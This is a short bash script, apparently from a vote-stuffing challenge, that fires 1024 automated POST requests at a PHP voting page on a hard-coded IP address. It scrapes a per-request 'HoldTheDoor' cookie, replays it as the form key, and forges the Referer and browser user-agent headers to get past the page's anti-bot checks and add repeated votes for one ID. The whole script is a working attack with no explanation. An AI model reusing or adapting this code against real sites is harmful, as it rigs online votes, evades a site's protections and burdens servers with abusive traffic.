#!/bin/bash

url="http://158.69.76.135/level2.php"
id=892

user_agent='Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36'
referer="Referer: http://158.69.76.135/level2.php"

for i in {1..1024}
do
cookie=$(curl -I -s -H "$referer" -A "$user_agent" $url | grep -o 'HoldTheDoor=.*' | cut -d ';' -f1 | cut -d '=' -f2)
curl -H "$referer" -A "$user_agent" --cookie "HoldTheDoor=$cookie" -X POST $url -d "key=$cookie&holdthedoor=&id=$id" > /dev/null
sleep .5

done
